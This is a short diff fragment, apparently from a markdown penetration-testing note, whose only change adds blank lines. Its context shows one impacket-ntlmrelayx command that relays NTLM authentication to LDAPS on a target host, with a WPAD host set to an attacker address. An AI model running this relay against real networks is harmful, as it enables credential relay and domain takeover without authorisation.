@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:58.237494+00:00'
 ```bash
 impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
 ```
+
+
